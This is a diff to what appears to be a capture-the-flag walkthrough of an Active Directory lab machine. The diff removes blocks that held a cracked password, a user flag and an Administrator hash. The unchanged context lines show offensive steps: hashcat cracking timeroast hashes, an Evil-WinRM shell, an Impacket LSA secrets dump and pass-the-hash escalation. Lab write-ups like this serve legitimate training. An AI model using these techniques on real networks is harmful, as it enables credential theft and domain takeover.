@@ -265,12 +265,6 @@ After collecting `$sntp-ms$` hashes using `timeroast.py`. Then, I used Hashcat t
 └─$ ./hashcat.bin -a 0 -m 31300 -O ../hash_clean.txt /usr/share/wordlists/rockyou.txt
 ```
 
-{{% fixit-encryptor "Rusty88!" "Cracked password" %}}
-
-  `Rusty88!`
-
-{{% /fixit-encryptor %}}
-
 > [!NOTE]
 > Always try cracked machine account passwords for interactive logon (Kerberos/smbexec), privilege escalations, or re-use across misconfigured services.
 
@@ -428,14 +422,9 @@ Warning: User is not needed for Kerberos auth. Ticket will be used
 Info: Establishing connection to remote endpoint
 ```
 
-{{% fixit-encryptor "6f92a47b73eed7da85cd8455b44e23e4" "Flag User" %}}
-
   ```powershell
   *Evil-WinRM* PS C:\Users\bb.morgan\Documents> type ../desktop/user.txt
-  6f92a47b73eed7da85cd8455b44e23e4
   ```
-
-{{% /fixit-encryptor %}}
 
 ## Post-Exploitation
 
@@ -714,12 +703,6 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
 ```
-
-{{% fixit-encryptor "f7a351e12f70cc177a1d5bd11b28ac26" "Administrator hash" %}}
-
-  `f7a351e12f70cc177a1d5bd11b28ac26`
-
-{{% /fixit-encryptor %}}
 
 With the Administrator hash extracted, I generated a TGT and used Evil-WinRM to get full access as the domain administrator
 
